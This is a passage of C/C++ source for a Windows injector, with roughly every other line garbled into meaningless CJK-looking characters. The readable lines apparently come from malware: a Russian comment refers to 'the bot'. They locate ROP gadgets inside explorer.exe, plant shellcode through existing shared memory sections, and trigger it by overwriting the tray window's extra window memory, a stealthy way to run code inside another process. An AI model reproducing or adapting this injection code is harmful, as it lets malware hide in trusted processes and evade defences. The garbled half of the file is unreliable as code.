਀ऀऀऀऀऀऀऀ昀漀爀⠀ 圀伀刀䐀 挀 㴀 　㬀 挀 㰀 渀琀䠀攀愀搀攀爀猀ⴀ㸀䘀椀氀攀䠀攀愀搀攀爀⸀一甀洀戀攀爀伀昀匀攀挀琀椀漀渀猀㬀 挀⬀⬀ ⤀ 
							{਀ऀऀऀऀऀऀऀऀ椀昀⠀ ℀瀀氀猀琀爀挀洀瀀椀䄀⠀ ⠀倀䌀䠀䄀刀⤀猀攀挀琀椀漀渀嬀挀崀⸀一愀洀攀Ⰰ ∀⸀琀攀砀琀∀ ⤀ ⤀ 
								{਀ऀऀऀऀऀऀऀऀऀ倀嘀伀䤀䐀 戀愀猀攀䄀搀搀爀攀猀猀 㴀 刀琀氀伀昀昀猀攀琀吀漀倀漀椀渀琀攀爀⠀ ⠀倀嘀伀䤀䐀⤀洀漀搀猀嬀椀崀Ⰰ ⠀倀嘀伀䤀䐀⤀猀攀挀琀椀漀渀嬀挀崀⸀嘀椀爀琀甀愀氀䄀搀搀爀攀猀猀 ⤀㬀 
									DWORD rva = CompareMemoryAndRead( process, baseAddress, section[c].Misc.VirtualSize, memory, size );਀ऀऀऀऀऀऀऀऀऀ椀昀⠀ 爀瘀愀 ⤀ 
										ret = RtlOffsetToPointer( baseAddress, rva );਀ऀऀऀऀऀऀऀऀऀ戀爀攀愀欀㬀 
								}਀ऀऀऀऀऀऀऀ紀 
						}਀ऀऀऀऀऀ紀 
					if( ret ) break;਀ऀऀऀऀ紀 
				HEAP::Free(buffer);਀ऀऀऀ紀 
		}਀ऀऀ䠀䔀䄀倀㨀㨀䘀爀攀攀⠀洀漀搀猀⤀㬀 
	}਀ 
	return ret;਀紀 
਀倀嘀伀䤀䐀 䘀椀渀搀䌀漀搀攀䤀渀倀爀漀挀攀猀猀⠀ 䠀䄀一䐀䰀䔀 瀀爀漀挀攀猀猀Ⰰ 倀嘀伀䤀䐀 洀攀洀漀爀礀Ⰰ 匀䤀娀䔀开吀 猀椀稀攀 ⤀ 
{਀ऀ倀嘀伀䤀䐀 愀搀搀爀攀猀猀 㴀 一唀䰀䰀㬀 
	MEMORY_BASIC_INFORMATION info;਀ऀ䐀圀伀刀䐀 爀瘀愀㬀 
਀ऀ眀栀椀氀攀⠀ 瀀嘀椀爀琀甀愀氀儀甀攀爀礀䔀砀⠀ 瀀爀漀挀攀猀猀Ⰰ 愀搀搀爀攀猀猀Ⰰ ☀椀渀昀漀Ⰰ 猀椀稀攀漀昀⠀椀渀昀漀⤀ ⤀ ⤀ 
	{਀ऀऀ椀昀⠀ 爀瘀愀 㴀 䌀漀洀瀀愀爀攀䴀攀洀漀爀礀䄀渀搀刀攀愀搀⠀ 瀀爀漀挀攀猀猀Ⰰ 愀搀搀爀攀猀猀Ⰰ 椀渀昀漀⸀刀攀最椀漀渀匀椀稀攀Ⰰ 洀攀洀漀爀礀Ⰰ 猀椀稀攀 ⤀ ⤀ 
			return RtlOffsetToPointer( info.AllocationBase, rva );਀ 
		address = RtlOffsetToPointer( address, info.RegionSize);਀ऀ紀 
਀ऀ爀攀琀甀爀渀 一唀䰀䰀㬀 
}਀ 
bool Explore32CreateSH( INJECT32_DATA* ourMapInjectData, HANDLE process, INJECT32_DATA* remoteAddress, DWORD sizeOfShellCode)਀笀 
	UCHAR firstSign[] = {0xB9, 0x94, 0x00, 0x00, 0x00, 0xF3, 0xA5, 0x5F, 0x33, 0xC0, 0x5E, 0x5D, 0xC2, 0x08, 0x00};਀ऀ唀䌀䠀䄀刀 挀氀搀刀攀琀䈀礀琀攀猀嬀崀 㴀 笀　砀䘀䐀Ⰰ 　砀䌀㌀紀㬀 
	UCHAR stdRetBytes[] = {0xFC, 0xC3};਀ऀ唀䌀䠀䄀刀 爀攀琀䈀礀琀攀猀嬀崀 㴀 笀　砀㔀㠀Ⰰ 　砀䌀㌀紀㬀 
	UCHAR jmpEaxBytes[] = {0xFF, 0xE0};਀ 
	ourMapInjectData->newLongVTable[0] = (DWORD)&remoteAddress->newLongVTable[5];਀ऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀渀攀眀䰀漀渀最嘀吀愀戀氀攀嬀㔀崀 㴀 ⠀䐀圀伀刀䐀⤀䜀攀琀䬀椀唀猀攀爀䄀瀀挀䐀椀猀瀀愀琀挀栀攀爀倀爀漀挀⠀⤀㬀 
	ourMapInjectData->newLongVTable[7] = (DWORD)FindCodeInProcessCode( process, cldRetBytes, sizeof(cldRetBytes) );਀ऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀渀攀眀䰀漀渀最嘀吀愀戀氀攀嬀㘀崀 㴀 ⠀䐀圀伀刀䐀⤀䘀椀渀搀䌀漀搀攀䤀渀倀爀漀挀攀猀猀䌀漀搀攀⠀ 瀀爀漀挀攀猀猀Ⰰ 昀椀爀猀琀匀椀最渀Ⰰ 猀椀稀攀漀昀⠀昀椀爀猀琀匀椀最渀⤀ ⤀㬀 
਀ऀ昀漀爀⠀ 䐀圀伀刀䐀 椀 㴀 　㬀 椀 㰀 ㌀㈀㬀 椀⬀⬀ ⤀ 漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀爀漀瀀䌀漀搀攀嬀椀崀 㴀 椀㬀 
਀ऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀爀漀瀀䌀漀搀攀嬀㈀㔀崀 㴀 ⠀䐀圀伀刀䐀⤀䘀椀渀搀䌀漀搀攀䤀渀倀爀漀挀攀猀猀䌀漀搀攀⠀ 瀀爀漀挀攀猀猀Ⰰ 猀琀搀刀攀琀䈀礀琀攀猀Ⰰ 猀椀稀攀漀昀⠀猀琀搀刀攀琀䈀礀琀攀猀⤀ ⤀㬀 
	ourMapInjectData->ropCode[28] = (DWORD)FindCodeInProcessCode( process, retBytes, sizeof(retBytes) );਀ऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀爀漀瀀䌀漀搀攀嬀㈀㤀崀 㴀 　砀㜀　㬀 
	HANDLE ntdll = pGetModuleHandleA("ntdll.dll");਀ऀ䠀䄀一䐀䰀䔀 欀攀爀渀攀氀㌀㈀ 㴀 瀀䜀攀琀䴀漀搀甀氀攀䠀愀渀搀氀攀䄀⠀∀欀攀爀渀攀氀㌀㈀⸀搀氀氀∀⤀㬀 
	ourMapInjectData->ropCode[30] = (DWORD)pGetProcAddress( ntdll, "_chkstk" );਀ऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀爀漀瀀䌀漀搀攀嬀㌀㄀崀 㴀 ⠀䐀圀伀刀䐀⤀瀀䜀攀琀倀爀漀挀䄀搀搀爀攀猀猀⠀ 欀攀爀渀攀氀㌀㈀Ⰰ ∀圀爀椀琀攀倀爀漀挀攀猀猀䴀攀洀漀爀礀∀ ⤀㬀 
	ourMapInjectData->ropCode[5] = (DWORD)NtCurrentProcess();਀ऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀爀漀瀀䌀漀搀攀嬀㘀崀 㴀 ⠀䐀圀伀刀䐀⤀瀀䜀攀琀倀爀漀挀䄀搀搀爀攀猀猀⠀ 渀琀搀氀氀Ⰰ ∀愀琀愀渀∀ ⤀㬀 
	ourMapInjectData->ropCode[7] = (DWORD)&remoteAddress->injectCode[0];਀ऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀爀漀瀀䌀漀搀攀嬀㠀崀 㴀 猀椀稀攀伀昀匀栀攀氀氀䌀漀搀攀㬀 
	ourMapInjectData->ropCode[9] = (DWORD)&remoteAddress->ropCode[12];਀ऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀爀漀瀀䌀漀搀攀嬀㄀　崀 㴀 漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀爀漀瀀䌀漀搀攀嬀㘀崀㬀ऀ⼀⼀ 攀愀砀 㴀 愀琀愀渀 
	ourMapInjectData->ropCode[4] = ourMapInjectData->ropCode[28];	// pop eax, ret਀ऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀爀漀瀀䌀漀搀攀嬀㄀㄀崀 㴀 ⠀䐀圀伀刀䐀⤀䘀椀渀搀䌀漀搀攀䤀渀倀爀漀挀攀猀猀䌀漀搀攀⠀ 瀀爀漀挀攀猀猀Ⰰ 樀洀瀀䔀愀砀䈀礀琀攀猀Ⰰ 猀椀稀攀漀昀⠀樀洀瀀䔀愀砀䈀礀琀攀猀⤀ ⤀㬀 
	ourMapInjectData->ropCode[14] = (DWORD)&remoteAddress->codeData;	਀ 
	return true;਀紀 
਀一吀匀吀䄀吀唀匀 伀瀀攀渀䄀渀搀䴀愀瀀匀攀挀琀椀漀渀⠀ 倀䠀䄀一䐀䰀䔀 瀀栀匀攀挀琀椀漀渀Ⰰ 倀圀䌀䠀䄀刀 渀愀洀攀匀攀挀琀椀漀渀Ⰰ 倀嘀伀䤀䐀 ⨀愀搀搀爀攀猀猀 ⤀ 
{਀ऀ唀一䤀䌀伀䐀䔀开匀吀刀䤀一䜀 甀猀一愀洀攀匀攀挀琀椀漀渀㬀 
	pRtlInitUnicodeString( &usNameSection, nameSection );਀ 
	OBJECT_ATTRIBUTES objAttr;਀ऀ⼀⼀䤀渀椀琀椀愀氀椀稀攀伀戀樀攀挀琀䄀琀琀爀椀戀甀琀攀猀⠀ ☀漀戀樀䄀琀琀爀Ⰰ ☀甀猀一愀洀攀匀攀挀琀椀漀渀Ⰰ 伀䈀䨀开伀倀䔀一䤀䘀Ⰰ 　Ⰰ 　 ⤀㬀 
	objAttr.uLength = sizeof(OBJECT_ATTRIBUTES);਀ऀ漀戀樀䄀琀琀爀⸀栀刀漀漀琀䐀椀爀攀挀琀漀爀礀 㴀 　㬀 
	objAttr.uAttributes = OBJ_OPENIF;਀ऀ漀戀樀䄀琀琀爀⸀瀀伀戀樀攀挀琀一愀洀攀 㴀 ☀甀猀一愀洀攀匀攀挀琀椀漀渀㬀 
	objAttr.pSecurityDescriptor = 0;਀ऀ漀戀樀䄀琀琀爀⸀瀀匀攀挀甀爀椀琀礀儀甀愀氀椀琀礀伀昀匀攀爀瘀椀挀攀 㴀 　㬀 
	਀ऀ一吀匀吀䄀吀唀匀 猀琀 㴀 ⠀一吀匀吀䄀吀唀匀⤀瀀一琀伀瀀攀渀匀攀挀琀椀漀渀⠀ 瀀栀匀攀挀琀椀漀渀Ⰰ 匀䔀䌀吀䤀伀一开䴀䄀倀开刀䔀䄀䐀 簀 匀䔀䌀吀䤀伀一开䴀䄀倀开圀刀䤀吀䔀Ⰰ ☀漀戀樀䄀琀琀爀 ⤀㬀 
	if( NT_SUCCESS(st) )਀ऀ笀 
		ULONG_PTR size = 0;਀ऀऀ猀琀 㴀 ⠀一吀匀吀䄀吀唀匀⤀瀀一琀䴀愀瀀嘀椀攀眀伀昀匀攀挀琀椀漀渀⠀ ⨀瀀栀匀攀挀琀椀漀渀Ⰰ 一琀䌀甀爀爀攀渀琀倀爀漀挀攀猀猀⠀⤀Ⰰ 愀搀搀爀攀猀猀Ⰰ 　Ⰰ 　Ⰰ 一唀䰀䰀Ⰰ ☀猀椀稀攀Ⰰ 嘀椀攀眀唀渀洀愀瀀Ⰰ 　Ⰰ 倀䄀䜀䔀开刀䔀䄀䐀圀刀䤀吀䔀⤀㬀 
		if( !NT_SUCCESS(st) ) pNtClose(*phSection);਀ऀ紀 
਀ऀ爀攀琀甀爀渀 猀琀㬀 
}਀ 
bool OpenSectionForInject(PHANDLE phSection, PVOID *address, ULONG *size)਀笀 
	PWCHAR sections[] = {਀ऀऀ䰀∀尀尀䈀愀猀攀一愀洀攀搀伀戀樀攀挀琀猀尀尀匀栀椀洀匀栀愀爀攀搀䴀攀洀漀爀礀∀Ⰰ 
		L"\\BaseNamedObjects\\windows_shell_global_counters",਀ऀऀ䰀∀尀尀䈀愀猀攀一愀洀攀搀伀戀樀攀挀琀猀尀尀䴀匀䌀吀䘀⸀匀栀愀爀攀搀⸀匀䘀䴀⸀䴀䤀䠀∀Ⰰ 
		L"\\BaseNamedObjects\\MSCTF.Shared.SFM.AMF",਀ऀऀ䰀∀尀尀䈀愀猀攀一愀洀攀搀伀戀樀攀挀琀猀尀尀唀爀氀娀漀渀攀猀匀䴀开䄀搀洀椀渀椀猀琀爀愀琀漀爀∀Ⰰ 
		L"\\BaseNamedObjects\\UrlZonesSM_SYSTEM",਀ऀऀ　 
	};਀ 
	for( int i = 0; sections[i]; i++ )਀ऀ笀 
		if( NT_SUCCESS( OpenAndMapSection( phSection, sections[i], address ) ) )਀ऀऀ笀 
			MEMORY_BASIC_INFORMATION info;਀ 
			pVirtualQuery( *address, &info, sizeof(info) );਀ऀऀऀ⨀猀椀稀攀 㴀 椀渀昀漀⸀刀攀最椀漀渀匀椀稀攀㬀 
਀ऀऀऀ爀攀琀甀爀渀 琀爀甀攀㬀 
		}਀ऀ紀 
਀ऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
}਀ 
INJECT32_DATA* InjectExplore32CreateSH( DWORD pid, INJECT32_DATA* ourMapInjectData, DWORD sizeOfShellCodeWithData, DWORD sizeOfShellCode )਀笀 
	INJECT32_DATA *ret = NULL, *remoteAddress = NULL;਀ऀ⼀⼀䐀圀伀刀䐀 瀀椀搀 㴀 䜀攀琀䔀砀瀀氀漀爀攀爀倀椀搀⠀⤀㬀 
਀ऀ椀昀⠀ 瀀椀搀 ⤀ 
	{਀ऀऀ䠀䄀一䐀䰀䔀 瀀爀漀挀攀猀猀 㴀 瀀伀瀀攀渀倀爀漀挀攀猀猀⠀ 倀刀伀䌀䔀匀匀开儀唀䔀刀夀开䤀一䘀伀刀䴀䄀吀䤀伀一 簀 倀刀伀䌀䔀匀匀开嘀䴀开刀䔀䄀䐀Ⰰ 䘀䄀䰀匀䔀Ⰰ 瀀椀搀 ⤀㬀 
		if( process != INVALID_HANDLE_VALUE )਀ऀऀ笀 
			if( remoteAddress = (INJECT32_DATA*)FindCodeInProcess( process, ourMapInjectData, sizeOfShellCodeWithData ) )਀ऀऀऀ笀 
				if( Explore32CreateSH( ourMapInjectData, process, remoteAddress, sizeOfShellCode ) )਀ऀऀऀऀ笀 
					ret = remoteAddress;਀ऀऀऀऀ紀 
			}਀ 
			pCloseHandle(process);਀ऀऀ紀 
	}਀ऀ爀攀琀甀爀渀 爀攀琀㬀 
}਀ 
਀䐀圀伀刀䐀 䤀渀樀攀挀琀㌀㈀一漀爀洀愀氀⠀ 倀䄀刀䄀䴀开䐀䄀吀䄀⨀ 瀀愀爀愀洀 ⤀ 
{਀ऀ倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀 搀栀 㴀 ⠀倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀⤀瀀愀爀愀洀ⴀ㸀椀洀愀最攀䈀愀猀攀㬀 
	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((BYTE*)dh + dh->e_lfanew);਀ऀ䐀圀伀刀䐀 椀洀愀最攀匀椀稀攀 㴀 瀀攀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀匀椀稀攀伀昀䤀洀愀最攀㬀 
	ULONG relocRVA   = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;਀ऀ唀䰀伀一䜀 爀攀氀漀挀匀椀稀攀  㴀 瀀攀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䐀愀琀愀䐀椀爀攀挀琀漀爀礀嬀䤀䴀䄀䜀䔀开䐀䤀刀䔀䌀吀伀刀夀开䔀一吀刀夀开䈀䄀匀䔀刀䔀䰀伀䌀崀⸀匀椀稀攀㬀 
	ProcessRelocs( (PIMAGE_BASE_RELOCATION)( (DWORD)param->imageBase + relocRVA ), (DWORD)param->imageBase, (DWORD)param->imageBase - pe->OptionalHeader.ImageBase, relocSize );	਀ 
	InitializeAPI();਀ऀ䠀䄀一䐀䰀䔀 攀瘀 㴀 瀀伀瀀攀渀䔀瘀攀渀琀䄀⠀ 䔀嘀䔀一吀开䴀伀䐀䤀䘀夀开匀吀䄀吀䔀Ⰰ 䘀䄀䰀匀䔀Ⰰ ∀椀渀樀攀挀琀㌀㈀开攀瘀攀渀琀∀ ⤀㬀 
	if( ev ) pSetEvent(ev);਀⼀⼀ऀ瀀伀甀琀瀀甀琀䐀攀戀甀最匀琀爀椀渀最䄀⠀ ∀一攀眀䤀渀樀攀挀琀 琀漀 瀀爀漀挀攀猀猀 椀猀 伀䬀∀ ⤀㬀 
਀ऀ吀䤀渀樀攀挀琀䘀甀渀挀琀椀漀渀 昀甀渀挀 㴀 ⠀吀䤀渀樀攀挀琀䘀甀渀挀琀椀漀渀⤀⠀⠀䐀圀伀刀䐀⤀瀀愀爀愀洀ⴀ㸀椀洀愀最攀䈀愀猀攀 ⬀ ⠀䐀圀伀刀䐀⤀瀀愀爀愀洀ⴀ㸀昀甀渀挀⤀㬀 
	func(0);਀ऀ爀攀琀甀爀渀 　㬀 
}਀ 
bool InjectToProcess32( TInjectFunction func, DWORD pid, HWND wnd )਀笀 
	bool ret = false;਀ऀ䠀䄀一䐀䰀䔀 猀攀挀琀椀漀渀䠀愀渀搀氀攀㬀 
	PVOID ourMapAddress = NULL;਀ऀ䐀圀伀刀䐀 漀甀爀䴀愀瀀匀椀稀攀㬀 
	if( OpenSectionForInject( &sectionHandle, &ourMapAddress, &ourMapSize ) )਀ऀ笀 
		DWORD sizeOfShellCode = (DWORD)Inject32End - (DWORD)Inject32Start;਀ 
		DWORD sizeOfShellCodeWithData = sizeOfShellCode + sizeof(INJECT32_DATA);਀ 
		INJECT32_DATA* ourMapInjectData = (INJECT32_DATA*)(((DWORD)ourMapAddress + ourMapSize) - sizeOfShellCodeWithData); ਀ऀऀ洀开洀攀洀猀攀琀⠀ 漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀Ⰰ 　Ⰰ 猀椀稀攀伀昀匀栀攀氀氀䌀漀搀攀圀椀琀栀䐀愀琀愀 ⤀㬀 
		m_memcpy( &ourMapInjectData->injectCode[0], Inject32Start, sizeOfShellCode);਀ 
		HANDLE kernel32 = (HANDLE)pGetModuleHandleA("kernel32.dll");਀ऀऀ䠀䄀一䐀䰀䔀 甀猀攀爀㌀㈀ 㴀 ⠀䠀䄀一䐀䰀䔀⤀瀀䜀攀琀䴀漀搀甀氀攀䠀愀渀搀氀攀䄀⠀∀甀猀攀爀㌀㈀⸀搀氀氀∀⤀㬀 
		*(PVOID*)&ourMapInjectData->codeData._CloseHandle = pGetProcAddress( kernel32, "CloseHandle" );਀ऀऀ⨀⠀倀嘀伀䤀䐀⨀⤀☀漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀挀漀搀攀䐀愀琀愀⸀开䴀愀瀀嘀椀攀眀伀昀䘀椀氀攀 㴀 瀀䜀攀琀倀爀漀挀䄀搀搀爀攀猀猀⠀ 欀攀爀渀攀氀㌀㈀Ⰰ ∀䴀愀瀀嘀椀攀眀伀昀䘀椀氀攀∀ ⤀㬀 
		*(PVOID*)&ourMapInjectData->codeData._OpenFileMappingA = pGetProcAddress( kernel32, "OpenFileMappingA" );਀ऀऀ⨀⠀倀嘀伀䤀䐀⨀⤀☀漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀挀漀搀攀䐀愀琀愀⸀开䌀爀攀愀琀攀吀栀爀攀愀搀 㴀 瀀䜀攀琀倀爀漀挀䄀搀搀爀攀猀猀⠀ 欀攀爀渀攀氀㌀㈀Ⰰ ∀䌀爀攀愀琀攀吀栀爀攀愀搀∀ ⤀㬀 
		*(PVOID*)&ourMapInjectData->codeData._OutputDebugStringA = pGetProcAddress( kernel32, "OutputDebugStringA" );਀ऀऀ⨀⠀倀嘀伀䤀䐀⨀⤀☀漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀挀漀搀攀䐀愀琀愀⸀开匀攀琀圀椀渀搀漀眀䰀漀渀最䄀 㴀 瀀䜀攀琀倀爀漀挀䄀搀搀爀攀猀猀⠀ 甀猀攀爀㌀㈀Ⰰ ∀匀攀琀圀椀渀搀漀眀䰀漀渀最䄀∀ ⤀㬀 
਀ऀऀ䤀一䨀䔀䌀吀㌀㈀开䐀䄀吀䄀⨀ 爀攀洀漀琀攀匀栀攀氀氀䌀漀搀攀䴀愀瀀㬀 
		if( remoteShellCodeMap = InjectExplore32CreateSH( pid, ourMapInjectData, sizeOfShellCodeWithData, sizeOfShellCode ) )਀ऀऀ笀 
			//HWND wnd = (HWND)pFindWindowA( "Shell_TrayWnd", NULL );਀ऀऀऀ䰀伀一䜀 漀氀搀䰀漀渀最 㴀 ⠀䰀伀一䜀⤀瀀䜀攀琀圀椀渀搀漀眀䰀漀渀最䄀⠀ 眀渀搀Ⰰ 　 ⤀㬀 
਀ऀऀऀ椀昀⠀ 眀渀搀 ☀☀ 漀氀搀䰀漀渀最 ⤀ 
			{਀ऀऀऀऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀挀漀搀攀䐀愀琀愀⸀椀渀樀攀挀琀䘀氀愀最 㴀 䘀䄀䰀匀䔀㬀 
				ourMapInjectData->codeData.wnd = wnd;਀ऀऀऀऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀挀漀搀攀䐀愀琀愀⸀漀氀搀䰀漀渀最 㴀 漀氀搀䰀漀渀最㬀 
				਀ऀऀऀऀ䐀圀伀刀䐀 椀洀愀最攀䈀愀猀攀 㴀 ⠀䐀圀伀刀䐀⤀䜀攀琀䤀洀愀最攀䈀愀猀攀⠀⤀㬀 
				ourMapInjectData->codeData.injectNormalRoutine = (PVOID)((DWORD)Inject32Normal - imageBase);਀ऀऀऀऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀挀漀搀攀䐀愀琀愀⸀瀀愀爀愀洀⸀昀甀渀挀 㴀 ⠀倀嘀伀䤀䐀⤀⠀⠀䐀圀伀刀䐀⤀昀甀渀挀 ⴀ 椀洀愀最攀䈀愀猀攀⤀㬀 
਀ऀऀऀऀ瀀氀猀琀爀挀瀀礀䄀⠀ 漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀挀漀搀攀䐀愀琀愀⸀猀攀挀琀椀漀渀一愀洀攀Ⰰ ∀椀渀樀攀挀琀㌀㈀开猀攀挀琀椀漀渀∀ ⤀㬀 
				ourMapInjectData->codeData.temp[0] = '1';਀ऀऀऀऀ漀甀爀䴀愀瀀䤀渀樀攀挀琀䐀愀琀愀ⴀ㸀挀漀搀攀䐀愀琀愀⸀琀攀洀瀀嬀㄀崀 㴀 　㬀 
਀ऀऀऀऀ倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀 搀栀 㴀 ⠀倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀⤀椀洀愀最攀䈀愀猀攀㬀 
				PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((BYTE*)dh + dh->e_lfanew);਀ऀऀऀऀ䐀圀伀刀䐀 椀洀愀最攀匀椀稀攀 㴀 瀀攀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀匀椀稀攀伀昀䤀洀愀最攀㬀 
				HANDLE map = (HANDLE)pCreateFileMappingA( 0, NULL, PAGE_EXECUTE_READWRITE | SEC_COMMIT, 0, imageSize, ourMapInjectData->codeData.sectionName );਀ऀऀऀऀ椀昀⠀ 洀愀瀀 ⤀ 
				{਀ऀऀऀऀऀ倀嘀伀䤀䐀 洀愀瀀瀀椀渀最 㴀 瀀䴀愀瀀嘀椀攀眀伀昀䘀椀氀攀⠀ 洀愀瀀Ⰰ 䘀䤀䰀䔀开䴀䄀倀开䄀䰀䰀开䄀䌀䌀䔀匀匀 簀 䘀䤀䰀䔀开䴀䄀倀开䔀堀䔀䌀唀吀䔀Ⰰ 　Ⰰ 　Ⰰ 　 ⤀㬀 
					if( mapping )਀ऀऀऀऀऀ笀 
						m_memcpy( mapping, (void*)imageBase, imageSize );਀ 
						//восстанивливаем адрес по таблице релоков на основе ImageBase бота਀ऀऀऀऀऀऀ唀䰀伀一䜀 爀攀氀漀挀刀嘀䄀   㴀 瀀攀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䐀愀琀愀䐀椀爀攀挀琀漀爀礀嬀䤀䴀䄀䜀䔀开䐀䤀刀䔀䌀吀伀刀夀开䔀一吀刀夀开䈀䄀匀䔀刀䔀䰀伀䌀崀⸀嘀椀爀琀甀愀氀䄀搀搀爀攀猀猀㬀 
						ULONG relocSize  = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;਀ऀऀऀऀऀऀ倀爀漀挀攀猀猀刀攀氀漀挀猀⠀ ⠀倀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一⤀⠀ 椀洀愀最攀䈀愀猀攀 ⬀ 爀攀氀漀挀刀嘀䄀 ⤀Ⰰ ⠀䐀圀伀刀䐀⤀洀愀瀀瀀椀渀最Ⰰ 瀀攀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䤀洀愀最攀䈀愀猀攀 ⴀ 椀洀愀最攀䈀愀猀攀Ⰰ 爀攀氀漀挀匀椀稀攀 ⤀㬀ऀ 
਀ऀऀऀऀऀऀ䠀䄀一䐀䰀䔀 攀瘀㬀 
						if( ev = pCreateEventA( NULL, 0, 0, "inject32_event" ) )਀ऀऀऀऀऀऀ笀 
							pSetWindowLongA( wnd, 0, (LONG)&remoteShellCodeMap->newLongVTable[0] );਀ऀऀऀऀऀऀऀ瀀匀攀渀搀一漀琀椀昀礀䴀攀猀猀愀最攀䄀⠀ 眀渀搀Ⰰ 圀䴀开倀䄀䤀一吀Ⰰ 　Ⰰ 　 ⤀㬀 
਀ऀऀऀऀऀऀऀ椀昀⠀ ℀瀀圀愀椀琀䘀漀爀匀椀渀最氀攀伀戀樀攀挀琀⠀ 攀瘀Ⰰ 㘀　　　　 ⤀ ⤀ 
								ret = true;਀ऀऀऀऀऀऀऀ瀀䌀氀漀猀攀䠀愀渀搀氀攀⠀攀瘀⤀㬀 
						}਀ऀऀऀऀऀऀ瀀唀渀洀愀瀀嘀椀攀眀伀昀䘀椀氀攀⠀洀愀瀀瀀椀渀最⤀㬀 
					}਀ऀऀऀऀ紀 
			}਀ऀऀ紀 
		pNtUnmapViewOfSection( NtCurrentProcess(), ourMapAddress );਀ऀऀ瀀一琀䌀氀漀猀攀⠀猀攀挀琀椀漀渀䠀愀渀搀氀攀⤀㬀 
	}਀ऀ爀攀琀甀爀渀 爀攀琀㬀 
}਀ 
bool InjectExplore32( TInjectFunction func )਀笀 
	DWORD pid = GetExplorerPid();਀ऀ䠀圀一䐀 眀渀搀 㴀 ⠀䠀圀一䐀⤀瀀䘀椀渀搀圀椀渀搀漀眀䄀⠀ ∀匀栀攀氀氀开吀爀愀礀圀渀搀∀Ⰰ 一唀䰀䰀 ⤀㬀 
	return InjectToProcess32( func, pid, wnd );਀紀 
਀戀漀漀氀 䤀渀樀攀挀琀吀漀倀爀漀挀攀猀猀㌀㈀⠀ 吀䤀渀樀攀挀琀䘀甀渀挀琀椀漀渀 昀甀渀挀Ⰰ 挀漀渀猀琀 挀栀愀爀⨀ 挀氀愀猀猀圀渀搀 ⤀ 
{਀ऀ䠀圀一䐀 眀渀搀 㴀 ⠀䠀圀一䐀⤀瀀䘀椀渀搀圀椀渀搀漀眀䄀⠀ 挀氀愀猀猀圀渀搀Ⰰ 一唀䰀䰀 ⤀㬀 
	DWORD pid;਀ऀ瀀䜀攀琀圀椀渀搀漀眀吀栀爀攀愀搀倀爀漀挀攀猀猀䤀搀⠀ 眀渀搀Ⰰ ☀瀀椀搀 ⤀㬀 
	return InjectToProcess32( func, pid, wnd );਀紀 
਀紀 
਀�